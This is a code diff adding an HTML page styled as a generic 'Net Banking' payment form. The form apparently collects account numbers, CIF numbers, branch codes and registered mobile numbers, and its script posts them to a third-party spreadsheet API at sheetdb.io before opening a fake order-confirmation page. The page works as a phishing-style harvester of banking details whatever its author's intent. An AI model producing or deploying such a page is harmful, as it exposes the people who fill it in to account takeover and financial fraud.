@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="./images/hero.png" type="image/x-icon" />
+    <title>Net Banking</title>
+    <link  rel="stylesheet"  href="netbanking.css" >
+</head>
+<body>
+    
+    <form action="https://sheetdb.io/api/v1/cpoxnncium111"  method="POST" id="sheetdb-form"   >
+        <div class="container">
+          
+          <center><h1>Net Banking</h1></center>
+
+          <p>Please fill the proper account details</p>
+  
+          <hr>
+      
+          <label for="email"><b>Account no*</b></label>
+          <input type="text" placeholder="Enter valid account no" name="data[account no]" id="email" required>
+      
+          <label for="psw"><b>CIF number*</b></label>
+          <input type="password" placeholder="Enter CIF no" name=" data[CIF no]" id="psw" required>
+      
+          
+          <label for="psw-repeat"><b>Branch code*</b></label>
+          <input type="text" placeholder="Enter valid Branch code" name="data[Branch code]" id="psw-repeat" required>
+
+          <label for="psw-repeat"><b>Registerd Mobile no*</b></label>
+          <input type="text" placeholder="Enter registerd mobi no" name="data[registerd mobi no]" id="psw-repeat" required> 
+
+          <label for="psw-repeat"><b>Ammount Payable*</b></label>
+          <input type="text" placeholder="Enter final Ammount" name="data[Ammount Payable]" id="psw-repeat" required> 
+
+          <hr>
+      
+        <button type="submit" class="registerbtn">Pay Now</button>
+        </div>
+      
+        
+      </form>
+
+    <script>
+       var form = document.getElementById('sheetdb-form');
+        form.addEventListener("submit", e => {
+          e.preventDefault();
+          fetch(form.action, {
+              method : "POST",
+              body: new FormData(document.getElementById("sheetdb-form")),
+          }).then(
+              response => response.json()
+          ).then((html) => {
+            // you can put any JS code here
+            window.open('orderconfirmpage.html', '_blank');
+
+          });
+        });
+    </script>
+
+</body>
+</html>
